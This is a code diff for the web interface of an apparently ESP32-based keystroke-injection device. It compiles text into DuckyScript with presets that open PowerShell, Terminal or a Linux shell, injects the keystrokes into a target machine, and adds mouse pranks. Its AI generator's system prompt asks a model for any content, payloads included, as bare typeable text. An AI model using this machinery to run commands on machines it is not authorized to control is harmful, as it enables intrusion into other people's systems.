+    compiledLines.push('DELAY 1500');
+  } else if (headerPreset === 'win_powershell') {
+    compiledLines.push('REM --- Target: Windows PowerShell ---');
+    compiledLines.push('GUI r');
+    compiledLines.push('DELAY 1000');
+    compiledLines.push('STRING powershell');
+    compiledLines.push('ENTER');
+    compiledLines.push('DELAY 2000');
+  } else if (headerPreset === 'mac_terminal') {
+    compiledLines.push('REM --- Target: macOS Terminal ---');
+    compiledLines.push('GUI SPACE');
+    compiledLines.push('DELAY 1000');
+    compiledLines.push('STRING terminal');
+    compiledLines.push('ENTER');
+    compiledLines.push('DELAY 1500');
+  } else if (headerPreset === 'linux_terminal') {
+    compiledLines.push('REM --- Target: Linux Terminal ---');
+    compiledLines.push('CTRL ALT t');
+    compiledLines.push('DELAY 1500');
+  }
+
+  // Add a small initial delay so the HID device doesn't drop the very
+  // first STRING before the target input field has focus.
+  // (Only needed when no preset header already provides an initial delay.)
+  const hasHeader = headerPreset !== 'none';
+  if (!hasHeader && lines.some(l => l.length > 0)) {
+    compiledLines.push('DELAY 200');
+  }
+
+  for (let i = 0; i < lines.length; i++) {
+    const line = lines[i];
+    if (line.length === 0) {
+      if (autoEnter) compiledLines.push('ENTER');
+    } else {
+      compiledLines.push('STRING ' + line);
+      if (autoEnter) compiledLines.push('ENTER');
+    }
+    if (delayMs > 0) {
+      compiledLines.push('DELAY ' + delayMs);
+    }
+  }
+
+  return compiledLines.join('\n');
+}
+
+function updateCodeTyperCompiled() {
+  const inputEl = $('codeTyperInput');
+  const outputEl = $('codeTyperCompiled');
+  const delaySel = $('ctDelaySelect');
+  const autoEnterEl = $('ctAutoEnter');
+  if (!inputEl || !outputEl) return;
+
+  const raw = inputEl.value;
+  const delayMs = delaySel ? parseInt(delaySel.value, 10) || 0 : 300;
+  const autoEnter = autoEnterEl ? autoEnterEl.checked : true;
+
+  const compiled = compileTextToDucky(raw, delayMs, autoEnter, ctActiveHeader);
+  outputEl.value = compiled;
+
+  // Stats
+  const rawLines = raw ? raw.split('\n').length : 0;
+  const compiledLines = compiled ? compiled.split('\n').length : 0;
+
+  const rawStats = $('ctRawStats');
+  const compiledStats = $('ctCompiledStats');
+  if (rawStats) rawStats.textContent = `${rawLines} line${rawLines === 1 ? '' : 's'}`;
+  if (compiledStats) compiledStats.textContent = `${compiledLines} command line${compiledLines === 1 ? '' : 's'}`;
+}
+
+async function ctTypeHid() {
+  const compiled = $('codeTyperCompiled')?.value?.trim();
+  if (!compiled) { toast('Enter code or text first', 'warn'); return; }
+  toast('Sending keystrokes to target…', 'warn', 3000);
+  try {
+    await deviceFetch('/', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: 'duckyscript=' + encodeURIComponent(compiled)
+    });
+    toast('Keystrokes injected successfully ✓');
+  } catch (e) {
+    toast('Error sending keystrokes: ' + e.message, 'err');
+  }
+}
+
+function ctToEditor() {
+  const compiled = $('codeTyperCompiled')?.value?.trim();
+  if (!compiled) { toast('Enter code or text first', 'warn'); return; }
+  // Navigate to the scripts page (where the DuckyScript editor lives)
+  const scriptsNav = document.querySelectorAll('.nav-item')[0];
+  goPage('scripts', scriptsNav);
+  // Small delay for the page transition, then populate the editor
+  setTimeout(() => {
+    const ta = $('editor');
+    if (ta) {
+      ta.value = compiled;
+      ta.dispatchEvent(new Event('input'));
+      if (typeof liveCompile === 'function') liveCompile();
+      if (typeof renderEditor === 'function') renderEditor();
+      toast('Pushed to DuckyScript Editor ✓');
+    } else {
+      toast('Editor not found', 'err');
+    }
+  }, 320);
+}
+
+async function ctSaveSd() {
+  const compiled = $('codeTyperCompiled')?.value?.trim();
+  if (!compiled) { toast('Enter code or text first', 'warn'); return; }
+
+  const filename = prompt('Filename to save on SD card:', 'code_snippet.txt');
+  if (!filename) return;
+
+  // Sanitise and ensure .txt extension
+  let safeName = filename.trim().replace(/^\/+/, '').replace(/\//g, '_');
+  if (!safeName) safeName = 'code_snippet.txt';
+  if (!safeName.match(/\.[a-zA-Z0-9]+$/)) safeName += '.txt';
+
+  const folder   = '/CodeSnippets';
+  const fullPath = folder + '/' + safeName;
+
+  toast('Saving to SD card...', 'warn', 4000);
+
+  try {
+    // Step 1: ensure /CodeSnippets folder exists (mkdir is idempotent on GhostChip)
+    try {
+      await fmFetchPost('/fm/mkdir?path=' + encodeURIComponent(folder));
+    } catch (_) { /* already exists - ok */ }
+
+    // Step 2: upload file content as multipart FormData (same as Favourites / Vault)
+    const uploadUrl   = fmBase() + '/fm/upload?path=' + encodeURIComponent(folder);
+    const crossOrigin = new URL(uploadUrl).origin !== location.origin;
+    const blob = new Blob([compiled], { type: 'text/plain' });
+    const file = new File([blob], safeName, { type: 'text/plain' });
+    const fd   = new FormData();
+    fd.append('file', file, safeName);
+
+    const opts = crossOrigin
+      ? { method: 'POST', mode: 'no-cors', body: fd }
+      : { method: 'POST', headers: { 'Accept': '*/*' }, body: fd };
+
+    await fetch(uploadUrl, opts);
+    toast('Saved to SD: ' + fullPath + ' ✓');
+  } catch (e) {
+    toast('Error saving to SD card: ' + (e.message || e), 'err');
+  }
+}
+
+function ctCopyCompiled() {
+  const compiled = $('codeTyperCompiled')?.value?.trim();
+  if (!compiled) { toast('Enter code or text first', 'warn'); return; }
+  navigator.clipboard.writeText(compiled).then(() => {
+    toast('DuckyScript copied to clipboard ✓');
+  }).catch(() => {
+    toast('Failed to copy to clipboard', 'err');
+  });
+}
+
+function ctClear() {
+  const ta = $('codeTyperInput');
+  if (ta) {
+    ta.value = '';
+    updateCodeTyperCompiled();
+    ctSyncLineNums();
+    ta.focus();
+    toast('Editor cleared');
+  }
+}
+
+// ─── Code Typer OpenRouter AI Assistant ───
+function ctToggleAiBar() {
+  const bar = $('ctAiBar');
+  const btn = $('ctAiToggleBtn');
+  if (!bar) return;
+  const isHidden = bar.style.display === 'none' || !bar.style.display;
+  bar.style.display = isHidden ? 'flex' : 'none';
+  if (btn) btn.classList.toggle('active', isHidden);
+
+  if (isHidden) {
+    // Check if OpenRouter key exists
+    const key = OPENROUTER_KEY || localStorage.getItem('gc_openrouter_key') || '';
+    const keyNotice = $('ctAiKeyNotice');
+    if (keyNotice) keyNotice.style.display = key ? 'none' : 'block';
+
+    const input = $('ctAiPromptInput');
+    if (input) {
+      input.focus();
+      if (!input._boundKeydown) {
+        input._boundKeydown = true;
+        input.addEventListener('keydown', (e) => {
+          if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) {
+            e.preventDefault();
+            ctGenerateAI();
+          }
+        });
+      }
+    }
+  }
+}
+
+function ctAiSetPrompt(prefix) {
+  const bar = $('ctAiBar');
+  const btn = $('ctAiToggleBtn');
+  if (bar && bar.style.display === 'none') {
+    bar.style.display = 'flex';
+    if (btn) btn.classList.add('active');
+  }
+  const input = $('ctAiPromptInput');
+  if (input) {
+    input.value = prefix;
+    input.focus();
+    input.selectionStart = input.selectionEnd = input.value.length;
+  }
+}
+
+function ctSaveInlineKey() {
+  const input = $('ctAiInlineKeyInput');
+  const k = input?.value?.trim();
+  if (!k) { toast('Enter OpenRouter API key first', 'warn'); return; }
+  OPENROUTER_KEY = k;
+  localStorage.setItem('gc_openrouter_key', k);
+  if ($('openrouterApiKeyInput')) $('openrouterApiKeyInput').value = '';
+  const keyNotice = $('ctAiKeyNotice');
+  if (keyNotice) keyNotice.style.display = 'none';
+  toast('OpenRouter API Key saved ✓');
+}
+
+async function ctGenerateAI() {
+  const promptInput = $('ctAiPromptInput')?.value?.trim();
+  if (!promptInput) {
+    toast('Please enter a description or prompt for the AI', 'warn');
+    $('ctAiPromptInput')?.focus();
+    return;
+  }
+
+  const keyToUse = OPENROUTER_KEY || localStorage.getItem('gc_openrouter_key') || '';
+  if (!keyToUse || keyToUse.length < 5) {
+    const keyNotice = $('ctAiKeyNotice');
+    if (keyNotice) keyNotice.style.display = 'block';
+    toast('Please enter your OpenRouter API Key first', 'err');
+    $('ctAiInlineKeyInput')?.focus();
+    return;
+  }
+
+  const modelSelect = $('ctAiModelSelect');
+  const modelToUse = modelSelect ? modelSelect.value : 'google/gemini-2.0-flash-001';
+
+  const btn = $('ctAiGenBtn');
+  const oldBtnHtml = btn ? btn.innerHTML : '';
+  if (btn) {
+    btn.disabled = true;
+    btn.innerHTML = '<span>Generating…</span>';
+  }
+
+  toast(`Generating content with ${modelToUse.split('/')[1] || 'AI'}…`, 'warn', 6000);
+
+  const endpoint = 'https://openrouter.ai/api/v1/chat/completions';
+  const headers = {
+    'Content-Type': 'application/json',
+    'Authorization': 'Bearer ' + keyToUse,
+    'HTTP-Referer': window.location.href,
+    'X-Title': 'GhostChip Code Typer'
+  };
+
+  const systemInstruction = `You are an expert typing assistant for GhostChip Code Typer.
+The user wants you to create ANY content (programming code, shell script, payload, configuration, documentation, professional/casual email, resignation letter, note, memo, poem, or raw text).
+
+STRICT RULES:
+1. Output ONLY the raw content itself.
+2. DO NOT include conversational text, preambles, explanations, or greeting intros (e.g. "Sure, here is the code:").
+3. DO NOT wrap the output in markdown code fences (no \`\`\` or \`\`\`language tags) - output pure plain text so it can be typed directly via USB HID keystroke simulation.
+4. Maintain exact spacing, indentation, and structure appropriate for the requested content.`;
+
+  try {
+    const res = await fetch(endpoint, {
+      method: 'POST',
+      headers,
+      body: JSON.stringify({
+        model: modelToUse,
+        messages: [
+          { role: 'system', content: systemInstruction },
+          { role: 'user', content: promptInput }
+        ],
+        temperature: 0.5,
+        max_tokens: 4000
+      })
+    });
+
+    if (!res.ok) {
+      let errMsg = res.statusText;
+      try {
+        const errJson = await res.json();
+        errMsg = errJson.error?.message || errMsg;
+      } catch (_) {}
+      throw new Error(errMsg);
+    }
+
+    const data = await res.json();
+    let content = data.choices?.[0]?.message?.content;
+    if (!content) throw new Error('No content returned from OpenRouter AI');
+
+    // Strip accidental markdown code blocks if the model still wrapped it
+    content = content.replace(/^```[a-zA-Z0-9_-]*\r?\n/, '').replace(/\r?\n```\s*$/, '');
+
+    // Set into editor
+    const ta = $('codeTyperInput');
+    if (ta) {
+      ta.value = content;
+      updateCodeTyperCompiled();
+      ctSyncLineNums();
+      ta.focus();
+    }
+
+    toast('✨ Content generated & loaded into Code Typer ✓');
+  } catch (e) {
+    toast('OpenRouter Error: ' + (e.message || e), 'err', 5000);
+  } finally {
+    if (btn) {
+      btn.disabled = false;
+      btn.innerHTML = oldBtnHtml;
+    }
+  }
+}
+
+// ─── Media Controller App ───
+function sendMediaCmd(cmd) {
+  navigator.vibrate && navigator.vibrate(15);
+  deviceFetch('/media', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: `cmd=${encodeURIComponent(cmd)}`
+  });
+}
+
+// ─── Mouse Utility App ───
+let muClickerInterval = null;
+let muJigglerInterval = null;
+let muClickCount = 0;
+let muJiggleState = 1;
+
+function initMouseUtilApp() {
+  muShowView('menu');
+}
+
+function muShowView(view) {
+  $('mu-menu').style.display = (view === 'menu') ? 'flex' : 'none';
+  $('mu-clicker').style.display = (view === 'clicker') ? 'flex' : 'none';
+  $('mu-jiggler').style.display = (view === 'jiggler') ? 'flex' : 'none';
+  $('mu-drawpad').style.display = (view === 'drawpad') ? 'flex' : 'none';
+  $('mu-drunk').style.display = (view === 'drunk') ? 'flex' : 'none';
+  $('mu-scroller').style.display = (view === 'scroller') ? 'flex' : 'none';
+  $('mu-presenter').style.display = (view === 'presenter') ? 'flex' : 'none';
+  if (view === 'drawpad') initDrawPadApp();
+  if (view === 'menu') muCleanup(); // Stop everything if returning to menu
+}
+
+function muCleanup() {
+  muStopClicker();
+  muStopJiggler();
+  muStopDrunk();
+  muStopScroll();
+  if (muDrawHeld) {
+    deviceFetch('/mouse', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: `release=left` });
+    muDrawHeld = false;
+  }
+}
+
+// Auto Clicker
+function muStartClicker() {
+  if (muClickerInterval) return;
+  const target = parseInt($('mu-clicks-target').value) || 0;
+  muClickCount = 0;
+  
+  $('mu-clicker-start').disabled = true;
+  $('mu-clicker-stop').disabled = false;
+  
+  const delayMs = parseInt($('mu-clicks-delay').value) || 100;
+  
+  muClickerInterval = setInterval(() => {
+    deviceFetch('/mouse', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: 'click=left'
+    }).catch(e => console.error("Click error:", e));
+    
+    muClickCount++;
+    $('mu-clicks-counter').innerText = `${muClickCount} / ${target || '∞'}`;
+    
+    if (target > 0 && muClickCount >= target) {
+      muStopClicker();
+    }
+  }, Math.max(10, delayMs)); // minimum 10ms
+}
+
+function muStopClicker() {
+  if (muClickerInterval) {
+    clearInterval(muClickerInterval);
+    muClickerInterval = null;
+  }
+  const target = parseInt($('mu-clicks-target').value) || 0;
+  $('mu-clicks-counter').innerText = `${muClickCount} / ${target || '∞'}`;
+  $('mu-clicker-start').disabled = false;
+  $('mu-clicker-stop').disabled = true;
+}
+
+// Mouse Jiggler
+function muStartJiggler() {
+  if (muJigglerInterval) return;
+  const speed = parseInt($('mu-jiggle-speed').value) || 2000;
+  
+  $('mu-jiggler-start').disabled = true;
+  $('mu-jiggler-stop').disabled = false;
+  $('mu-jiggle-icon').style.opacity = '1';
+  $('mu-jiggle-icon').style.color = 'var(--primary)';
+  
+  muJigglerInterval = setInterval(() => {
+    let delta = (muJiggleState === 1) ? 10 : -10; // 10 pixels to ensure OS registers movement
+    muJiggleState *= -1;
+    $('mu-jiggle-icon').style.transform = (muJiggleState === 1) ? 'rotate(10deg)' : 'rotate(-10deg)';
+    
+    deviceFetch('/mouse', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: `x=${delta}&y=0`
+    }).catch(e => console.error("Jiggle error:", e));
+  }, speed);
+}
+
+function muStopJiggler() {
+  if (muJigglerInterval) {
+    clearInterval(muJigglerInterval);
+    muJigglerInterval = null;
+  }
+  $('mu-jiggler-start').disabled = false;
+  $('mu-jiggler-stop').disabled = true;
+  $('mu-jiggle-icon').style.opacity = '0.3';
+  $('mu-jiggle-icon').style.color = '';
+  $('mu-jiggle-icon').style.transform = 'rotate(0deg)';
+}
+
+// ─── Draw Pad ───
+let muDrawMode = 'mouse';
+let muDrawHeld = false;
+
+function muSetDrawMode(mode) {
+  muDrawMode = mode;
+  $('mu-dp-mouse-btn').className = mode === 'mouse' ? 'btn btn-primary' : 'btn btn-outline';
+  $('mu-dp-draw-btn').className = mode === 'draw' ? 'btn btn-primary' : 'btn btn-outline';
+  if (muDrawHeld) {
+    deviceFetch('/mouse', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: `release=left` });
+    muDrawHeld = false;
+  }
+}
+
+function initDrawPadApp() {
+  document.querySelectorAll('.trackpad-draw').forEach(pad => {
+    if (pad.hasAttribute('data-draw-init')) return;
+    pad.setAttribute('data-draw-init', '1');
+
+    pad.addEventListener('touchstart', e => {
+      e.preventDefault();
+      mouseLastX = e.touches[0].clientX;
+      mouseLastY = e.touches[0].clientY;
+      if (muDrawMode === 'draw') {
+        deviceFetch('/mouse', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: `hold=left` });
+        muDrawHeld = true;
+      }
+    }, { passive: false });
+
+    pad.addEventListener('touchmove', e => {
+      e.preventDefault();
+      if (mouseThrottle) return;
+      const dx = Math.round((e.touches[0].clientX - mouseLastX) * 1.5);
+      const dy = Math.round((e.touches[0].clientY - mouseLastY) * 1.5);
+      mouseLastX = e.touches[0].clientX;
+      mouseLastY = e.touches[0].clientY;
+
+      if (dx !== 0 || dy !== 0) {
+        deviceFetch('/mouse', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: `x=${dx}&y=${dy}` });
+        mouseThrottle = setTimeout(() => { mouseThrottle = null; }, 40);
+      }
+    }, { passive: false });
+    
+    pad.addEventListener('touchend', e => {
+      e.preventDefault();
+      if (e.touches.length === 0 && muDrawHeld) {
+        deviceFetch('/mouse', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: `release=left` });
+        muDrawHeld = false;
+      }
+    }, { passive: false });
+  });
+}
+
+// ─── Drunk Mouse ───
+let muDrunkTimeout = null;
+function muStartDrunk() {
+  if (muDrunkTimeout) return;
+  $('mu-drunk-start').disabled = true;
+  $('mu-drunk-stop').disabled = false;
+  $('mu-drunk-icon').style.opacity = '1';
+  
+  function triggerDrunk() {
+    let jx = (Math.random() - 0.5) * 150;
+    let jy = (Math.random() - 0.5) * 150;
+    deviceFetch('/mouse', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: `x=${Math.round(jx)}&y=${Math.round(jy)}` });
+    
+    let baseDelay = parseInt($('mu-drunk-speed').value) || 10000;
+    let nextDelay = baseDelay + (Math.random() * (baseDelay / 2)); // Add up to 50% randomness
+    muDrunkTimeout = setTimeout(triggerDrunk, nextDelay);
+  }
+  triggerDrunk();
+}
+
+function muStopDrunk() {
+  if (muDrunkTimeout) clearTimeout(muDrunkTimeout);
+  muDrunkTimeout = null;
+  $('mu-drunk-start').disabled = false;
+  $('mu-drunk-stop').disabled = true;
+  $('mu-drunk-icon').style.opacity = '0.3';
+}
+
+// ─── Auto Scroller ───
+let muScrollInterval = null;
+function muStartScroll() {
+  if (muScrollInterval) return;
+  $('mu-scroll-start').disabled = true;
+  $('mu-scroll-stop').disabled = false;
+  
+  // Set interval to a safer 250ms for ESP32 network stack, and change the scroll amount instead
+  muScrollInterval = setInterval(() => {
+    let speedAmt = parseInt($('mu-scroll-speed').value) || 3;
+    let dir = parseInt($('mu-scroll-dir').value) || -1;
+    let scrollVal = speedAmt * dir;
+    deviceFetch('/mouse', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: `scroll=${scrollVal}` });
+  }, 250);
+}
+function muStopScroll() {
+  if (muScrollInterval) clearInterval(muScrollInterval);
+  muScrollInterval = null;
+  $('mu-scroll-start').disabled = false;
+  $('mu-scroll-stop').disabled = true;
+}
